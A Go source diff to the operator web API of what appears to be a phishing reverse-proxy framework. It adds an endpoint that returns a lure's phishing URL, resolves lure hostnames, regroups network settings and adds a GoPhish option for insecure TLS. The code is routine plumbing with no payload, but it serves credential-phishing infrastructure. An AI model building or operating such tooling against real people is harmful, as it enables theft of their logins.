@@ -92,6 +92,7 @@ func (w *WebAPI) Start(port int) {
 
 	// Lure endpoints — reads: any auth; mutations: operator+
 	mux.HandleFunc("/api/lures", w.requireAuth(w.handleLures))
+	mux.HandleFunc("/api/lures/get-url", w.requireAuth(w.handleLureGetUrl))
 	mux.HandleFunc("/api/lures/create", w.requireOperator(w.handleLureCreate))
 	mux.HandleFunc("/api/lures/delete", w.requireOperator(w.handleLureDelete))
 
@@ -457,13 +458,15 @@ func (w *WebAPI) handleConfigFull(rw http.ResponseWriter, req *http.Request) {
 	}
 
 	configData := map[string]interface{}{
+		"network": map[string]interface{}{
+			"external_ip": w.cfg.GetServerExternalIP(),
+			"bind_ip":     w.cfg.GetServerBindIP(),
+			"https_port":  w.cfg.GetHttpsPort(),
+			"http_port":   w.cfg.GetHttpPort(),
+			"dns_port":    w.cfg.GetDnsPort(),
+		},
 		"general": map[string]interface{}{
-			"external_ip":    w.cfg.GetServerExternalIP(),
-			"bind_ip":        w.cfg.GetServerBindIP(),
 			"base_domain":    w.cfg.GetBaseDomain(),
-			"https_port":     w.cfg.GetHttpsPort(),
-			"http_port":      w.cfg.GetHttpPort(),
-			"dns_port":       w.cfg.GetDnsPort(),
 			"unauth_url":     w.cfg.GetUnauthUrl(),
 			"blacklist_mode": w.cfg.GetBlacklistMode(),
 		},
@@ -475,6 +478,7 @@ func (w *WebAPI) handleConfigFull(rw http.ResponseWriter, req *http.Request) {
 		"gophish": map[string]interface{}{
 			"admin_url": w.cfg.GetGoPhishAdminUrl(),
 			"api_key":   w.cfg.GetGoPhishApiKey(),
+			"insecure":  w.cfg.GetGoPhishInsecureTLS(),
 		},
 		"enabled_sites": enabledSites,
 		"phishlets":     phishlets,
@@ -492,12 +496,26 @@ func (w *WebAPI) handleUpdateConfig(rw http.ResponseWriter, req *http.Request) {
 	}
 
 	var payload struct {
-		General struct {
-			Domain           string `json:"domain"`
-			UnauthUrl        string `json:"unauth_url"`
-			TelegramBotToken string `json:"telegram_bot_token"`
-			TelegramChatId   string `json:"telegram_chat_id"`
+		Network *struct {
+			ExternalIP string `json:"external_ip"`
+			BindIP     string `json:"bind_ip"`
+			HttpsPort  int    `json:"https_port"`
+			HttpPort   int    `json:"http_port"`
+			DnsPort    int    `json:"dns_port"`
+		} `json:"network"`
+		General *struct {
+			Domain    string `json:"domain"`
+			UnauthUrl string `json:"unauth_url"`
 		} `json:"general"`
+		Telegram *struct {
+			BotToken string `json:"bot_token"`
+			ChatId   string `json:"chat_id"`
+		} `json:"telegram"`
+		Gophish *struct {
+			AdminUrl string `json:"admin_url"`
+			ApiKey   string `json:"api_key"`
+			Insecure bool   `json:"insecure"`
+		} `json:"gophish"`
 	}
 
 	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
@@ -505,17 +523,54 @@ func (w *WebAPI) handleUpdateConfig(rw http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	if payload.General.Domain != "" {
-		w.cfg.SetServerBindIP(payload.General.Domain)
+	if payload.Network != nil {
+		if payload.Network.ExternalIP != "" {
+			w.cfg.SetServerExternalIP(payload.Network.ExternalIP)
+		}
+		if payload.Network.BindIP != "" {
+			w.cfg.SetServerBindIP(payload.Network.BindIP)
+		}
+		if payload.Network.HttpsPort > 0 {
+			w.cfg.SetHttpsPort(payload.Network.HttpsPort)
+		}
+		if payload.Network.HttpPort > 0 {
+			w.cfg.SetHttpPort(payload.Network.HttpPort)
+		}
+		if payload.Network.DnsPort > 0 {
+			w.cfg.SetDnsPort(payload.Network.DnsPort)
+		}
 	}
-	if payload.General.UnauthUrl != "" {
-		w.cfg.SetUnauthUrl(payload.General.UnauthUrl)
+
+	if payload.General != nil {
+		if payload.General.Domain != "" {
+			w.cfg.SetBaseDomain(payload.General.Domain)
+		}
+		if payload.General.UnauthUrl != "" {
+			w.cfg.SetUnauthUrl(payload.General.UnauthUrl)
+		}
 	}
-	if payload.General.TelegramBotToken != "" {
-		w.cfg.SetTelegramBotToken(payload.General.TelegramBotToken)
+
+	if payload.Telegram != nil {
+		if payload.Telegram.BotToken != "" {
+			w.cfg.SetTelegramBotToken(payload.Telegram.BotToken)
+		}
+		if payload.Telegram.ChatId != "" {
+			w.cfg.SetTelegramChatID(payload.Telegram.ChatId)
+		}
+		w.cfg.SetTelegramEnabled(true)
+		if w.hp != nil {
+			w.hp.ReloadTelegramConfig()
+		}
 	}
-	if payload.General.TelegramChatId != "" {
-		w.cfg.SetTelegramChatID(payload.General.TelegramChatId)
+
+	if payload.Gophish != nil {
+		if payload.Gophish.AdminUrl != "" {
+			w.cfg.SetGoPhishAdminUrl(payload.Gophish.AdminUrl)
+		}
+		if payload.Gophish.ApiKey != "" {
+			w.cfg.SetGoPhishApiKey(payload.Gophish.ApiKey)
+		}
+		w.cfg.SetGoPhishInsecureTLS(payload.Gophish.Insecure)
 	}
 
 	user, _ := w.getUserFromRequest(req)
@@ -727,11 +782,28 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 	for i := 0; i < w.cfg.GetLureCount(); i++ {
 		l, err := w.cfg.GetLure(i)
 		if err == nil {
+			// Resolve effective hostname: lure override > phishlet hostname
+			hostname := l.Hostname
+			if hostname == "" {
+				pl, perr := w.cfg.GetPhishlet(l.Phishlet)
+				if perr == nil {
+					purl, uerr := pl.GetLureUrl(l.Path)
+					if uerr == nil && len(purl) > len("https://") {
+						// Extract hostname from https://host/path
+						hostPath := purl[len("https://"):]
+						if idx := strings.Index(hostPath, "/"); idx != -1 {
+							hostname = hostPath[:idx]
+						} else {
+							hostname = hostPath
+						}
+					}
+				}
+			}
 			lures = append(lures, map[string]interface{}{
 				"index":            i,
 				"id":               l.Id,
 				"phishlet":         l.Phishlet,
-				"hostname":         l.Hostname,
+				"hostname":         hostname,
 				"path":             l.Path,
 				"redirect_url":     l.RedirectUrl,
 				"redirector":       l.Redirector,
@@ -749,6 +821,69 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 
 	rw.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(rw).Encode(lures)
+}
+
+func (w *WebAPI) handleLureGetUrl(rw http.ResponseWriter, req *http.Request) {
+	if req.Method != http.MethodGet {
+		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	idStr := req.URL.Query().Get("id")
+	if idStr == "" {
+		rw.Header().Set("Content-Type", "application/json")
+		rw.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(rw).Encode(map[string]string{"error": "id query parameter is required"})
+		return
+	}
+	id, err := strconv.Atoi(idStr)
+	if err != nil {
+		rw.Header().Set("Content-Type", "application/json")
+		rw.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(rw).Encode(map[string]string{"error": "invalid id"})
+		return
+	}
+
+	l, err := w.cfg.GetLure(id)
+	if err != nil {
+		rw.Header().Set("Content-Type", "application/json")
+		rw.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(rw).Encode(map[string]string{"error": "lure not found"})
+		return
+	}
+
+	pl, err := w.cfg.GetPhishlet(l.Phishlet)
+	if err != nil {
+		rw.Header().Set("Content-Type", "application/json")
+		rw.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(rw).Encode(map[string]string{"error": "phishlet not found"})
+		return
+	}
+
+	bhost, ok := w.cfg.GetSiteDomain(pl.Name)
+	if !ok || len(bhost) == 0 {
+		rw.Header().Set("Content-Type", "application/json")
+		rw.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(rw).Encode(map[string]string{"error": fmt.Sprintf("no hostname set for phishlet '%s'", pl.Name)})
+		return
+	}
+
+	var lureUrl string
+	if l.Hostname != "" {
+		lureUrl = "https://" + l.Hostname + l.Path
+	} else {
+		purl, err := pl.GetLureUrl(l.Path)
+		if err != nil {
+			rw.Header().Set("Content-Type", "application/json")
+			rw.WriteHeader(http.StatusInternalServerError)
+			json.NewEncoder(rw).Encode(map[string]string{"error": "failed to generate lure URL"})
+			return
+		}
+		lureUrl = purl
+	}
+
+	rw.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(rw).Encode(map[string]string{"url": lureUrl})
 }
 
 func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
